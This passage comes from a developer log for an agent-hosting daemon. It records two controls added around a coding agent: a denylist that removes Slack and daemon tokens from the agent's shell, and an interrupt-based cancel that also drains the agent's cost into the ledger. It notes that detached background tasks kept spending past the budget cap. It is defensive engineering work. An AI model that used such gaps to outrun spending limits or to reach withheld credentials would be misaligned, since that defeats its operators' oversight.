  and the workflow ran to `task_notification status=completed`, cost climbing to $0.92.** So
  `maxBudgetUsd` brakes only the *main* query loop; the **detached background task keeps spending past
  the cap**. (A tiny `maxBudgetUsd=$0.02` tripped the main turn BEFORE the workflow even detached, and
  still overshot to $0.18 — the budget check is coarse, at inter-step checkpoints, not continuous.)
- **Decision (mechanism for rider b):** cancellation = **`q.interrupt()`** (not `maxBudgetUsd`, not
  `close()` — `close()` would forfeit the final cost drain). **Auto-cancel on cap breach** = set
  `maxBudgetUsd = remaining thread headroom` on workflow turns so the SDK emits the budget SIGNAL, and
  have the **adapter interrupt the detached task the moment that signal appears while a workflow is
  running** (the signal alone is inert for a detached task; the interrupt makes it real and bounds the
  overshoot to the checkpoint interval). Wire `HarnessSession.interrupt() → q.interrupt()` (currently a
  no-op stub) so an architect `@Conduit cancel` and the inactivity watchdog can both halt a running
  turn; drain the aborted result's `total_cost_usd` into the ledger on EVERY interrupt/timeout path
  (today the 10-min timeout records ZERO cost — the M3.6 watch-list bug). The live `task_progress`
  token signal is available but unused: it is per-task tokens, not dollars, and converting needs
  pricing (notional on subscription auth), so the SDK's own `maxBudgetUsd` dollar accounting + interrupt
  is the cleaner lever.

## 2026-07-19 — M4 §5 done: env-scrub the agent shell + background cost/cancel

**Implementation (DESIGN.md §8 M4, the two "cheap riders").** 320 tests (+15), `tsc` + `check-ports`
clean, and BOTH riders verified end-to-end through the REAL adapter on subscription auth
(`smoke:cancel`): the agent shell saw `slack=[] conduit=[]` (scrubbed) with `PATH`/`HOME`/toolchain
intact, and a live multi-agent workflow was cancelled mid-run with its **$1.54** spend drained into the
notice.

**(a) Env-scrub the agent shell (`claude-code` adapter).** Every turn's `options.env` is
`scrubDaemonEnv(process.env)` — a **denylist** spread dropping keys matching `^SLACK_`/`^CONDUIT_` while
preserving everything else (belt-and-braces over the §4 credential/secret hard-deny floor, which STAYS).
Distinct from `CommandRunner`'s scrub (a fixed NAME list that also drops the Claude auth token, which a
deploy command doesn't need) — the agent MUST keep the Claude auth, and a prefix denylist never matches
it. Spike-proven the CLI runs under keychain OAuth with the scrubbed env.

**(b) Background-task cost accounting + cancellation (`claude-code` adapter + `session-manager.ts`).**
- **`HarnessSession.interrupt() → q.interrupt()`** (was an M1 no-op stub). `q.interrupt()` is the ONLY
  lever that actually halts a DETACHED background workflow (`maxBudgetUsd` does not — spike b); it stores
  the in-flight `activeQuery` (cleared in a `finally`) and only sets `cancelRequested` when a query is
  live, so a cancel on an idle session is a clean no-op that can't taint the next turn.
- **Drain-on-abort turn loop.** On any interrupt — inactivity timeout, `@Conduit cancel`, or a
  `maxBudgetUsd` breach that hit a RUNNING workflow — the loop stops the (possibly detached) task and
  drains the aborted result's `total_cost_usd` into the ledger, then posts ONE notice. Tolerates the
  SDK's post-abort pull throw (`[ede_diagnostic]`, spike b). Auto-cancel-on-breach = set `maxBudgetUsd`
  on workflow turns so the SDK emits the budget SIGNAL, which the adapter converts into a real
  `q.interrupt()` (the signal alone is inert for a detached task). Fixes the M3.6 watch-list bug where a
  wedged workflow recorded ZERO cost and could keep spending after the turn parked.
- **`@Conduit cancel`** (new `CommandName`, architect-only, thread-scoped — mirrors `stop`): interrupts
  the in-flight turn WITHOUT ending the session (session parks, thread continues). Gated on
  `status === "active"` (a genuinely running/spending turn; a semaphore-waiter is parked and hasn't
  spent). Slack `parseMentionCommand` + usage text + in-thread help updated.
- **Precise resume cap.** A resume that re-drives an approved WORKFLOW LAUNCH (`approval.tool_name ===
  "Workflow"`) is budget-capped so the breach brake arms; ordinary approved actions (a single Write)
  still resume UNCAPPED, even in a workflow-enabled session — the M3 "don't strand an approved action"
  invariant is preserved. `policy.ts` untouched; the flag threads through `executeTurn`.

**Ports stayed sealed.** `scrubDaemonEnv`/`AbortReason` live only in the adapter; `cancel` is an opaque
`CommandName`; no SDK/Slack type crossed into `src/core/`. `check-ports` clean.

**Adversarial review (5 dimensions — env-scrub security, cancel/interrupt races, cost accounting, ports/
correctness, test honesty — refute-by-default, run as a multi-agent workflow). 4 distinct findings
confirmed (1 refuted), all fixed before commit:**
- **(medium) Duplicate error on a no-result inactivity timeout.** The M4 §5 change replaced the old
  `return` with a `continue`+post-loop notice, but the trailing `if (!sawResult && !cancelRequested)`
  didn't exclude `abortReason`, so a wedged-no-result timeout posted the timeout notice AND a
  contradictory "produced no result". Fixed: `&& !abortReason`.
- **(real) A cancel racing a just-completed BUFFERED success dropped the reply AND lost its cost.** If a
  success was buffered (`pendingReply`) the instant before an out-of-band cancel, the post-loop treated
  it as a cancel and discarded the reply + its cost (the runaway cap under-counted a full turn). Fixed:
  a late cancel with a buffered reply delivers that reply + cost (the turn finished; the cancel missed).
- **(found by the fix's own new test) Timeout-drain lost the aborted result via a dangling `next()`.**
  `Promise.race([iterator.next(), timeout])` leaves the losing pull pending; the old code `return`ed so
  it never mattered, but draining called `next()` AGAIN — the stale pull swallowed the interrupt's
  aborted result and the new pull got `done`, so the timeout path drained ZERO cost. Fixed by holding a
  SINGLE in-flight `pending` pull and re-racing it across abort re-arms (the cancel path was unaffected —
  its interrupt resolves the very pull the race awaits, which is why the real smoke drained correctly).
  This is exactly why the review flagged the drain path as untested; the added injectable-inactivity test
  caught it.
- **(medium/low) Resume cap too broad.** The first cut capped EVERY resume in a workflow session,
  re-stranding ordinary approved near-budget actions (the M3 regression). Fixed with the workflow-launch-
  only cap above. Residual (documented): an already-AT-cap workflow-launch resume runs uncapped rather
  than stranding the approved launch — its full spend is still drained, with `@Conduit cancel` + the
  inactivity watchdog as backstops.
- **Refuted (correctly):** the out-of-band cancel test does exercise the real drain path (the aborted
  result sets `abortReason="cancel"` and drains before the notice).

**M4 §5 watch-list updates:** the M3.6/M3.8 watch-list items — "a wedged workflow records zero cost and
`q.interrupt()` may not cancel it" — are now RESOLVED (drain-on-abort + real interrupt). The env-dump
hard-deny floor stays as defense-in-depth; the denylist env-scrub means the daemon's Slack/cloud tokens
are no longer even present in the agent shell's environ.

**Files:** `src/adapters/claude-code/adapter.ts` (scrubDaemonEnv, interrupt wiring, drain-on-abort loop,
single-pending pull, injectable inactivity for tests), `src/core/session-manager.ts` (cancelSession,
`cancel` dispatch, workflow-launch-only resume cap, help text), `src/core/types.ts` (`cancel`
CommandName), `src/adapters/slack/adapter.ts` (parse + usage), `tests/adapter-claude-code.test.ts` (+9),
`tests/session-manager.test.ts` (+5), `tests/adapter-slack.test.ts` (+1), `tests/fakes.ts`
(interrupt hooks), `scripts/smoke-cancel.ts` (new), `spikes/m4/{env-scrub,workflow-interrupt}.ts` (new).
**Next: M4 §6 — README/runbook + sample service unit (the FINAL M4 section).**
